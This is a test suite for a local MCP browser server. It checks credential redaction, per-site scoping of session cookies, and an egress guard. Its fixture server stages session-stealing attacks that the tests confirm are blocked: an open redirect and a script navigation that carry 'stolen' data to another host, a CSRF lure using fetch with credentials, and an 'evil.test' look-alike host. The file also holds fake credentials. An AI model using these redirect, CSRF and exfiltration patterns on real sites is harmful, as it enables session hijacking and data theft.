import { describe, it, expect, beforeAll, afterAll, afterEach } from 'vitest';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import fs from 'node:fs';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { CreateMessageRequestSchema, ElicitRequestSchema } from '@modelcontextprotocol/sdk/types.js';
import { createServer } from '../../src/server.js';
import { UsageTracker } from '../../src/cost/tracker.js';
import { DEFAULT_CONFIG, type LocalMcpConfig } from '../../src/config/schema.js';
import { BrowserManager } from '../../src/browser/manager.js';
import { addSite, isSignedInSite, loadSites, normaliseSite, removeSite, siteMatches } from '../../src/security/sites.js';
import { luhn, redactSecrets } from '../../src/security/redact.js';
import { readAudit } from '../../src/security/audit.js';
import { postureFindings } from '../../src/cli/admin.js';

type Text = { type: string; text: string };
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'lmcp-posture-'));
const texts = (r: { content: unknown }) => (r.content as Text[]).map((c) => c.text).join('\n');

// Fake credentials assembled at runtime so secret scanners don't flag this file.
const FAKE_STRIPE = ['sk', 'live', 'Z'.repeat(8) + 'fakefakefake1234'].join('_');
const FAKE_GH = 'ghp' + '_' + 'x'.repeat(36);
const FAKE_CARD = '4242 4242 4242 4242'; // Stripe's public test card: passes Luhn

describe('redactSecrets', () => {
  it('replaces credentials with labelled stubs that keep a short prefix', () => {
    const r = redactSecrets(`key ${FAKE_STRIPE} and ${FAKE_GH} card ${FAKE_CARD}`);
    expect(r.text).not.toContain(FAKE_STRIPE);
    expect(r.text).not.toContain(FAKE_GH);
    expect(r.text).toContain('sk_live_[redacted stripe-key]');
    expect(r.text).toContain('[redacted card-number…4242]');
    expect(r.found).toEqual({ 'stripe-key': 1, 'github-token': 1, 'card-number': 1 });
  });

  it('leaves ordinary numbers and prose alone', () => {
    const plain = 'Order 1234567890123 shipped on 2026-11-25; call 415 555 0100. Use sk-learn for ML.';
    expect(redactSecrets(plain).text).toBe(plain);
    expect(luhn('1234567890123')).toBe(false);
    expect(luhn('0000000000000000')).toBe(false);
  });

  it('removes whole private key blocks', () => {
    const pem = ['-----BEGIN', 'PRIVATE KEY-----\nMIIBVQIBADAN\n-----END', 'PRIVATE KEY-----'].join(' ');
    expect(redactSecrets(`x ${pem} y`).text).toBe('x [redacted private-key] y');
  });
});

describe('signed-in sites', () => {
  it('normalises URLs, hosts and globs', () => {
    expect(normaliseSite('https://Dashboard.Stripe.com/x?y=1')).toBe('dashboard.stripe.com');
    expect(normaliseSite('stripe.com')).toBe('stripe.com');
    expect(normaliseSite('*.stripe.com')).toBe('*.stripe.com');
    expect(normaliseSite('ftp://x')).toBeNull();
    expect(normaliseSite('')).toBeNull();
  });

  it('matches exact hosts and subdomain globs (apex included), never look-alikes', () => {
    expect(siteMatches('dashboard.stripe.com', 'dashboard.stripe.com')).toBe(true);
    expect(siteMatches('dashboard.stripe.com', 'docs.stripe.com')).toBe(false);
    expect(siteMatches('*.stripe.com', 'stripe.com')).toBe(true);
    expect(siteMatches('*.stripe.com', 'a.b.stripe.com')).toBe(true);
    expect(siteMatches('*.stripe.com', 'evilstripe.com')).toBe(false);
    expect(isSignedInSite('https://stripe.com.evil.test/', [{ host: '*.stripe.com', addedAt: '', via: 'manual' }])).toBe(false);
  });

  it('persists add and remove inside the profile directory, without duplicates', () => {
    const dir = path.join(tmp(), 'profile');
    expect(addSite(dir, 'https://dashboard.stripe.com', 'login')).toBe('dashboard.stripe.com');
    addSite(dir, 'dashboard.stripe.com');
    expect(loadSites(dir).map((s) => s.host)).toEqual(['dashboard.stripe.com']);
    expect(removeSite(dir, 'dashboard.stripe.com')).toBe(true);
    expect(loadSites(dir)).toEqual([]);
  });
});

// Loopback under two names: "localhost" is the signed-in site, "127.0.0.1" is anyone else.
const cookieSeen: Array<{ path: string; cookie: string | undefined }> = [];
let server: http.Server;
let port = 0;
const signedIn = (p: string) => `http://localhost:${port}${p}`;
const stranger = (p: string) => `http://127.0.0.1:${port}${p}`;

beforeAll(async () => {
  server = http.createServer((req, res) => {
    const url = req.url ?? '/';
    cookieSeen.push({ path: url, cookie: req.headers.cookie });
    if (url === '/login') {
      res.writeHead(200, { 'content-type': 'text/html', 'set-cookie': 'session=abc; Path=/; SameSite=None; Secure' });
      return res.end('<title>Login</title><main><h1>Signed in</h1></main>');
    }
    if (url.startsWith('/keys')) {
      res.writeHead(200, { 'content-type': 'text/html' });
      return res.end(`<title>Keys</title><main><h1>API keys</h1><p>Secret key: <code>${FAKE_STRIPE}</code></p>
        <table><tr><th>Name</th><th>Key</th></tr><tr><td>prod</td><td>${FAKE_STRIPE}</td></tr></table></main>`);
    }
    if (url === '/go') {
      // An open redirect on the signed-in site, pointed at someone else with data in the query.
      res.writeHead(302, { location: `http://127.0.0.1:${port}/landed?d=stolen-redirect` });
      return res.end();
    }
    if (url === '/hop') {
      res.writeHead(302, { location: '/go' }); // same-site hop first: the browser follows it unrouted
      return res.end();
    }
    if (url === '/jsgo') {
      res.writeHead(200, { 'content-type': 'text/html' });
      return res.end(`<title>JS</title><script>location.href = "http://127.0.0.1:${port}/landed?d=stolen-js"</script>`);
    }
    if (url === '/lure') {
      // A third-party page that tries to use the signed-in site's session from inside the browser.
      res.writeHead(200, { 'content-type': 'text/html' });
      return res.end(`<title>Lure</title><main><h1>Hello</h1>
        <img src="http://localhost:${port}/ride-img"><script>fetch("http://localhost:${port}/ride-fetch",{credentials:"include"}).catch(()=>{})</script></main>`);
    }
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end(`<title>Echo</title><main><h1>Echo</h1><p>cookie=${req.headers.cookie ?? 'none'}</p><button id="b">Go</button></main>`);
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
  port = (server.address() as AddressInfo).port;
});
afterAll(() => server.close());

const closers: Array<() => Promise<void>> = [];
afterEach(async () => {
  while (closers.length) await closers.pop()!();
});

function scopedConfig(policy: Partial<LocalMcpConfig['policy']> = {}, dir = tmp()): LocalMcpConfig {
  const profileDir = path.join(dir, 'profile');
  addSite(profileDir, 'localhost', 'login');
  return {
    ...DEFAULT_CONFIG,
    browser: { ...DEFAULT_CONFIG.browser, profile: 'persistent', profileDir },
    policy: { ...DEFAULT_CONFIG.policy, ...policy },
    audit: { enabled: true, path: path.join(dir, 'audit.jsonl') },
  };
}

async function connect(cfg: LocalMcpConfig, elicit?: (message: string) => boolean) {
  const tracker = new UsageTracker(path.join(tmp(), 'usage.db'));
  const srv = createServer({ config: cfg, tracker });
  const [ct, st] = InMemoryTransport.createLinkedPair();
  await srv.connect(st);
  const asked: string[] = [];
  const client = new Client({ name: 'posture-test', version: '1.0.0' }, { capabilities: elicit ? { elicitation: {} } : {} });
  if (elicit) {
    client.setRequestHandler(ElicitRequestSchema, async (req) => {
      asked.push(req.params.message);
      return elicit(req.params.message) ? { action: 'accept', content: { allow: true } } : { action: 'decline' };
    });
  }
  await client.connect(ct);
  closers.push(async () => {
    await client.close();
    await srv.close();
    tracker.close();
  });
  return { client, asked };
}

describe('session routing: only signed-in sites open with the saved profile', () => {
  it('sends the cookie to the signed-in site and nothing to anyone else', async () => {
    const profileDir = path.join(tmp(), 'profile');
    addSite(profileDir, 'localhost');
    const manager = new BrowserManager({ profile: 'persistent', profileDir });
    closers.push(() => manager.cleanup());

    expect(manager.scope).toBe('scoped');
    const login = await manager.getPage(signedIn('/login'));
    expect(login.signedIn).toBe(true);
    await login.close();

    const mine = await manager.getPage(signedIn('/echo'));
    expect(await mine.page.textContent('p')).toBe('cookie=session=abc');
    await mine.close();

    const other = await manager.getPage(stranger('/echo'));
    expect(other.signedIn).toBe(false);
    expect(await other.page.textContent('p')).toBe('cookie=none');
    await other.close();
  });

  it("a third-party page can't ride the session (no CSRF from the agent's browser)", async () => {
    const profileDir = path.join(tmp(), 'profile');
    addSite(profileDir, 'localhost');
    const manager = new BrowserManager({ profile: 'persistent', profileDir });
    closers.push(() => manager.cleanup());
    await (await manager.getPage(signedIn('/login'))).close();

    cookieSeen.length = 0;
    await (await manager.getPage(stranger('/lure'))).close();
    const rides = cookieSeen.filter((h) => h.path.startsWith('/ride'));
    expect(rides.length).toBeGreaterThan(0);
    expect(rides.every((h) => h.cookie === undefined)).toBe(true);
  });

  it('control: without a site list the same lure does carry the cookie (the 0.3 exposure)', async () => {
    const profileDir = path.join(tmp(), 'profile');
    const manager = new BrowserManager({ profile: 'persistent', profileDir });
    closers.push(() => manager.cleanup());
    expect(manager.scope).toBe('all-hosts');
    await (await manager.getPage(signedIn('/login'))).close();
    cookieSeen.length = 0;
    await (await manager.getPage(stranger('/lure'))).close();
    expect(cookieSeen.some((h) => h.path.startsWith('/ride') && h.cookie === 'session=abc')).toBe(true);
  });

  it('a profile with no site list keeps the 0.3 behaviour and warns once', async () => {
    const cfg = scopedConfig();
    fs.rmSync(path.join(cfg.browser.profileDir, 'localmcp-sites.json'));
    const { client } = await connect(cfg);
    const first = texts(await client.callTool({ name: 'browse', arguments: { url: stranger('/echo') } }));
    expect(first).toMatch(/predates localmcp 0\.4/);
    const second = texts(await client.callTool({ name: 'browse', arguments: { url: stranger('/echo') } }));
    expect(second).not.toMatch(/predates/);
  });
});

describe('egress guard after a signed-in read', () => {
  it('asks before opening a new host, and remembers a yes', async () => {
    const { client, asked } = await connect(scopedConfig(), () => true);
    await client.callTool({ name: 'browse', arguments: { url: stranger('/before') } }); // not tainted yet: no prompt
    expect(asked).toEqual([]);

    const read = await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
    expect(read.isError).toBeFalsy();

    const out = await client.callTool({ name: 'browse', arguments: { url: stranger('/x?d=stolen') } });
    expect(out.isError).toBeFalsy();
    expect(asked).toHaveLength(1);
    expect(asked[0]).toContain(`localhost:${port}`);

    await client.callTool({ name: 'browse', arguments: { url: stranger('/again') } });
    expect(asked).toHaveLength(1);
  });

  it('refuses when the user declines — even a host visited before the signed-in read', async () => {
    const { client } = await connect(scopedConfig(), () => false);
    await client.callTool({ name: 'browse', arguments: { url: stranger('/lure') } });
    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
    cookieSeen.length = 0;
    const r = await client.callTool({ name: 'browse', arguments: { url: stranger('/x?d=stolen') } });
    expect(r.isError).toBe(true);
    expect(texts(r)).toMatch(/declined/);
    expect(cookieSeen.some((h) => h.path.includes('stolen'))).toBe(false);
  });

  it('refuses with a fix when the client cannot ask; "open" and policy.allow let it through', async () => {
    const { client } = await connect(scopedConfig());
    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
    const r = await client.callTool({ name: 'links', arguments: { url: stranger('/x') } });
    expect(r.isError).toBe(true);
    expect(texts(r)).toMatch(/policy\.allow/);

    const open = await connect(scopedConfig({ egress: 'open' }));
    await open.client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
    expect((await open.client.callTool({ name: 'browse', arguments: { url: stranger('/x') } })).isError).toBeFalsy();

    const allowed = await connect(scopedConfig({ allow: ['localhost:*', '127.0.0.1:*'] }));
    await allowed.client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
    expect((await allowed.client.callTool({ name: 'browse', arguments: { url: stranger('/x') } })).isError).toBeFalsy();
  });
});

describe('review findings (2026-11-25): each one stays fixed', () => {
  const leaked = (tag: string) => cookieSeen.some((h) => h.path.includes(tag));

  it('#1 all-hosts scope: reading the attacker page first does not approve it', async () => {
    const cfg = scopedConfig();
    fs.rmSync(path.join(cfg.browser.profileDir, 'localmcp-sites.json')); // legacy profile: all hosts signed in
    const { client } = await connect(cfg);
    await client.callTool({ name: 'browse', arguments: { url: stranger('/lure') } });
    await client.callTool({ name: 'browse', arguments: { url: signedIn('/keys') } });
    cookieSeen.length = 0;
    const r = await client.callTool({ name: 'browse', arguments: { url: stranger('/x?d=stolen-allhosts') } });
    expect(r.isError).toBe(true);
    expect(texts(r)).toMatch(/sites add/);
    expect(leaked('stolen-allhosts')).toBe(false);
  });

  it('#2 a server redirect from a signed-in site to another host is stopped before it is sent', async () => {
    const { client } = await connect(scopedConfig());
    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
    cookieSeen.length = 0;
    for (const p of ['/go', '/hop']) {
      const r = await client.callTool({ name: 'browse', arguments: { url: signedIn(p) } });
      expect(r.isError).toBe(true);
    }
    expect(leaked('stolen-redirect')).toBe(false);
  });

  it('#2 a script navigation to another host is stopped too', async () => {
    const { client } = await connect(scopedConfig());
    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
    cookieSeen.length = 0;
    await client.callTool({ name: 'browse', arguments: { url: signedIn('/jsgo') } });
    expect(leaked('stolen-js')).toBe(false);
  });

  it('#2 even the first signed-in call is guarded; control: with egress "open" the redirect leaks', async () => {
    const guarded = await connect(scopedConfig());
    cookieSeen.length = 0;
    await guarded.client.callTool({ name: 'browse', arguments: { url: signedIn('/go') } });
    expect(leaked('stolen-redirect')).toBe(false);

    const open = await connect(scopedConfig({ egress: 'open' }));
    cookieSeen.length = 0;
    await open.client.callTool({ name: 'browse', arguments: { url: signedIn('/go') } });
    expect(leaked('stolen-redirect')).toBe(true);
  });

  it('#3 the race: a call made while a signed-in read is in flight is already guarded', async () => {
    const { client } = await connect(scopedConfig());
    cookieSeen.length = 0;
    const [, out] = await Promise.all([
      client.callTool({ name: 'browse', arguments: { url: signedIn('/keys') } }),
      client.callTool({ name: 'browse', arguments: { url: stranger('/x?d=stolen-race') } }),
    ]);
    expect(out.isError).toBe(true);
    expect(leaked('stolen-race')).toBe(false);
  });

  it('#4 redaction is linear on hostile input and removes truncated keys', () => {
    const hostile = '-----BEGIN PRIVATE KEY-----\n'.repeat(200_000);
    const t = Date.now();
    redactSecrets(hostile);
    expect(Date.now() - t).toBeLessThan(2_000);
    const cut = ['-----BEGIN', 'PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC'].join(' ');
    expect(redactSecrets(`a ${cut}`).text).toBe('a [redacted private-key]');
  });

  it('#5 the sampling prompt is redacted before it reaches the client model', async () => {
    const tracker = new UsageTracker(path.join(tmp(), 'usage.db'));
    const srv = createServer({ config: scopedConfig(), tracker });
    const [ct, st] = InMemoryTransport.createLinkedPair();
    await srv.connect(st);
    const prompts: string[] = [];
    const client = new Client({ name: 'sampler', version: '1.0.0' }, { capabilities: { sampling: {} } });
    client.setRequestHandler(CreateMessageRequestSchema, async (req) => {
      prompts.push(JSON.stringify(req.params.messages));
      return { role: 'assistant', model: 'fake', content: { type: 'text', text: '{"keys":[]}' } };
    });
    await client.connect(ct);
    closers.push(async () => { await client.close(); await srv.close(); tracker.close(); });
    await client.callTool({ name: 'extract', arguments: { url: signedIn('/keys'), schema: { keys: ['string'] } } });
    expect(prompts.length).toBe(1);
    expect(prompts[0]).not.toContain(FAKE_STRIPE);
  });

  it('#6 usage.db never stores query strings', async () => {
    const dbPath = path.join(tmp(), 'usage.db');
    const tracker = new UsageTracker(dbPath);
    const srv = createServer({ config: scopedConfig(), tracker });
    const [ct, st] = InMemoryTransport.createLinkedPair();
    await srv.connect(st);
    const client = new Client({ name: 'db', version: '1.0.0' });
    await client.connect(ct);
    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo?magic=hunter2'), diff: true } });
    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo?magic=hunter2'), diff: true } });
    const snaps = tracker.listSnapshots();
    await client.close(); await srv.close(); tracker.close();
    expect(fs.readFileSync(dbPath).includes(Buffer.from('hunter2'))).toBe(false);
    expect(snaps).toHaveLength(1); // the hashed key still identifies the page for diffs
  });

  it('#7 dates, timestamps and phone numbers are not mistaken for cards', () => {
    for (const s of ['2024-01-15 2024-01-16', '1732579200000', 'call 4155550100 now', '2026 2027 2028 2029']) {
      expect(redactSecrets(s).text).toBe(s);
    }
    expect(redactSecrets('3782 822463 10005').text).toContain('[redacted card-number…0005]'); // Amex test card
  });

  it('#8 public-suffix wildcards are refused; site list changes apply without a restart', () => {
    for (const w of ['*.com', '*.co.uk', '*.github.io', '*.pages.dev']) expect(normaliseSite(w)).toBeNull();
    expect(normaliseSite('*.stripe.com')).toBe('*.stripe.com');

    const profileDir = path.join(tmp(), 'profile');
    addSite(profileDir, 'localhost');
    const manager = new BrowserManager({ profile: 'persistent', profileDir });
    expect(manager.routeFor(stranger('/'))).toBe('anonymous');
    addSite(profileDir, '127.0.0.1');
    expect(manager.routeFor(stranger('/'))).toBe('signed-in');
    removeSite(profileDir, '127.0.0.1');
    expect(manager.routeFor(stranger('/'))).toBe('anonymous');
  });
});

describe('interact with a scoped profile', () => {
  it('stays listed, works on anonymous pages and is refused on signed-in ones', async () => {
    const { client } = await connect(scopedConfig());
    expect((await client.listTools()).tools.map((t) => t.name)).toContain('interact');
    const anon = await client.callTool({ name: 'interact', arguments: { url: stranger('/echo'), actions: [{ type: 'click', selector: '#b' }] } });
    expect(anon.isError).toBeFalsy();
    const mine = await client.callTool({ name: 'interact', arguments: { url: signedIn('/echo'), actions: [{ type: 'click', selector: '#b' }] } });
    expect(mine.isError).toBe(true);
    expect(texts(mine)).toMatch(/signed-in session/);
  });
});

describe('redaction and audit end to end', () => {
  it('keeps the key out of text and structuredContent, and logs the call without its query', async () => {
    const dir = tmp();
    const cfg = scopedConfig({}, dir);
    const { client } = await connect(cfg);
    const r = await client.callTool({ name: 'browse', arguments: { url: signedIn('/keys?token=hunter2') } });
    const all = texts(r) + JSON.stringify(r.structuredContent ?? {});
    expect(all).not.toContain(FAKE_STRIPE);
    expect(all).toContain('[redacted stripe-key]');
    expect(texts(r)).toMatch(/redacted 1 stripe-key/);

    const log = readAudit(cfg.audit.path);
    expect(log.at(-1)).toMatchObject({ tool: 'browse', session: 'signed-in', outcome: 'ok', path: '/keys', redactions: 1 });
    expect(fs.readFileSync(cfg.audit.path, 'utf-8')).not.toContain('hunter2');
  });

  it('diff snapshots are stored and served redacted', async () => {
    const tracker = new UsageTracker(path.join(tmp(), 'usage.db'));
    const srv = createServer({ config: scopedConfig(), tracker });
    const [ct, st] = InMemoryTransport.createLinkedPair();
    await srv.connect(st);
    const client = new Client({ name: 'snap', version: '1.0.0' });
    await client.connect(ct);
    closers.push(async () => { await client.close(); await srv.close(); tracker.close(); });

    await client.callTool({ name: 'browse', arguments: { url: signedIn('/keys'), diff: true } });
    expect(tracker.getSnapshot(signedIn('/keys'))!.markdown).not.toContain(FAKE_STRIPE);
    const { resources } = await client.listResources();
    const res = await client.readResource({ uri: resources[0].uri });
    expect(JSON.stringify(res)).not.toContain(FAKE_STRIPE);
  });

  it('never logs a query string, even inside a refusal reason', async () => {
    const cfg = scopedConfig();
    const { client } = await connect(cfg);
    await client.callTool({ name: 'browse', arguments: { url: 'not a url?token=hunter2' } });
    expect(fs.readFileSync(cfg.audit.path, 'utf-8')).not.toContain('hunter2');
  });

  it('logs refusals too', async () => {
    const cfg = scopedConfig({ deny: ['127.0.0.1'] });
    const { client } = await connect(cfg);
    await client.callTool({ name: 'browse', arguments: { url: stranger('/x') } });
    expect(readAudit(cfg.audit.path).at(-1)).toMatchObject({ outcome: 'blocked', host: `127.0.0.1:${port}` });
  });
});

describe('doctor', () => {
  it('flags an unscoped signed-in session and an open egress policy as risks', () => {
    const cfg = scopedConfig({ egress: 'open' });
    fs.rmSync(path.join(cfg.browser.profileDir, 'localmcp-sites.json'));
    const levels = postureFindings(cfg).filter((f) => f.level === 'risk').map((f) => f.text);
    expect(levels.join('\n')).toMatch(/Every page opens signed in/);
    expect(levels.join('\n')).toMatch(/egress is "open"/);
  });

  it('is clean for a scoped profile with the defaults', () => {
    expect(postureFindings(scopedConfig()).some((f) => f.level === 'risk')).toBe(false);
  });
});
